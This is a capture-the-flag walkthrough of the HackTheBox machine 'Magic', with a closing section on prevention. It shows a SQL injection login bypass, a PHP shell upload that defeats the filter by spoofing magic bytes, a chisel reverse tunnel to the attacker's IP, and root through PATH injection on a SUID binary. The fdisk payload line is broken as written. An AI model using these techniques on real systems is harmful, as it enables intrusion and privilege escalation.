## **Description**

Hello hackers, I hope you are doing well. We are doing [Magic](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.185
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06d489bf51f7fc0cf9085e9763648dca (RSA)

80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found OpenSSH on port 22 and an HTTP web server on port 80.

### Web

Let's navigate to the web page.

![](1.png)

It's a website for image.

On the bottom right we see a login link, let's go there.

![](2.png)

Trying some default credentials didn't work but managed to login using a sql injection `' or 1=1 --`

![](3.png)

Let's upload an image and see if it appears in the website.

![](4.png)

I uploaded a codium logo and I we can clearly see it's been added to the other images.

Opening the image in a new tabs reveals that the upload directory located at `/images/uploads`.

## **Foothold**

Now let's upload a reverse shell.

![](5.png)

It only allows images, this means there is a filter, let's try adding an image extension at the end of the name(Exp: shell.php.png).

![](6.png)

It detected what we're trying to do and didn't allow the upload.

Since the name of the box is `Magic`, this might be a hint that the upload script is using the magic number as a filter.

Let's see if that true by changing the magic number of our shell to the one of an image.

With the help of `hexedit`, we change the first 4 Bytes with `FF D8 FF E0`

![](7.png)

Press `ctrl` + `X` to save.

>Note: You might need to add `<?php` at the start of the php code since we've replaced it with the magic bytes.

Now if we uploaded the shell again with the extension `.php.jpeg`, we can bypass the filter.

![](8.png)

Now we setup a listener and request the file at `/images/uploads/shell.php.jpeg`

![](9.png)

Great! We got access to the target.

## **Privilege Escalation**

### www-data --> theseus

Since there is a login page, let's see if we can find any passwords in the web files.

![](10.png)

On `db.php5` file we found the database credentials, unfortunately for us the user `theseus` doesn't reuse his password.

Let's connect to the mysql server with the command: `mysql -u theseus -p`

![](11.png)

Mysql is not installed!!

#### Chisel

With the help of `chisel`, let's forward the mysql port and access it from out machine.

on the attacker machine we setup a chisel server:

```bash
./chisel server --reverse --port 9002
```

Now on the target we connect to the server:

```bash
./chisel client 10.10.17.90:9002 R:3306:localhost:3306
```

Now on our attacking machine we connect to the mysql server:

```bash
mysql -h 127.0.0.1 -P 3306 -u theseus -p
```

![](12.png)

We found a password, let's see if `theseus` uses it.

```bash
www-data@ubuntu:/tmp/sirius$ su theseus                                                                                                                       
Password:                                                                                                                                                     
theseus@ubuntu:/tmp/sirius$ id                                                                                                                                
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

He does!

### theseus --> root

We see `theseus` is part of a group called `users`.

Let's run linpeas.

![](13.png)

There is an unknown suid binary the group `users` can execute.

After running the binary it shows some information about the system.

Let's run strings on it and see what command it's running.

![](14.png)

It's running command without a full path, that our window to get root.

We will exploit it using a technique called `Path Injection`

First we create a copy of one of the commands the binary is running, I'll be choosing `fdisk`.

Now we put the command we want to execute as root:

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash > /tmp/fdisk
```

We put the command in a file named fdisk in the tmp directory, and don't forget to give it execute permission `chmod +x /tmp/fdisk`

Now we inject the PATH variable by adding the `/tmp` directory to it.

```bash
export PATH=/tmp:$PATH
```

Now we just run the `/bin/sysinfo`, and we should find a copy of bash with suid permissions.

![](15.png)

We just run `/tmp/bash -p` to get a root shell.


## **Prevention**

### SQL injection

The login form is using the good old query for the login:

```php
$stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
```

The code is vulnerable because the user input is concatenated directly into the query

To prevent SQL injection, it's better to use prepared statement and parameterized queries which separate the user input from the query structure.

For more detail check the [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### Upload Filters

The first filter the upload.php use is extensions:

```php
// Check if image file is a actual image or fake image
if (isset($_POST["submit"])) {  
    // Allow certain file formats                                              
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));   
    if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
        echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";   
        $uploadOk = 0;                                                         
    }                     
```

The code uses `PATHINFO_EXTENSION` which strips the extension and stores is in the variable `imageFileType`, if the file has multiple extensions it simply strips the last one.

The second filter is the magic bytes:

```php
$allowed = array('2', '3');
[...]
if ($uploadOk === 1) {                                                     
        // Check if image is actually png or jpg using magic bytes             
        $check = exif_imagetype($_FILES["image"]["tmp_name"]);                 
        if (!in_array($check, $allowed)) {                                                                                                                    
            echo "<script>alert('What are you trying to do there?')</script>";
            $uploadOk = 0;
        }           
    }
```

Here it used `exif_imagetype` to read the first bytes of the file and checks it's signature and returns a constant value.

The returned value is then compared to the ones in `allowed`: `$allowed = array('2', '3');`.

Another factor to count in this vulnerability is the configuration in the `.htaccess` file.

```xml
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>
<Files ~ "\.(sh|sql)">
   order deny,allow
   deny from all
```

The configuration above used a regular expression that matches php file extension anywhere in the file, and if it does then the file is executed by the server if it's been requested.

If we check the `php7.3.conf` file we find the following.

```xml
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

This one also has a regex for php file but we can see a `$` at the end which means the php extension should be at the end of the file, this would have prevented us from executing our php script if it's for the htaccess configuration that overwrites it.

Another ways to prevent the file upload vulnerability is to ensure that the uploads directory does not have execute permission, and use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms. 

### Password

Passwords should never be stored in plain text but rather hashed using a strong hashing algorithms. The password also should not be reused.

### SUID Path Injection

To avoid this vulnerability you simply add full path to the commands executed in the binary (e.g.,/bin/cat)
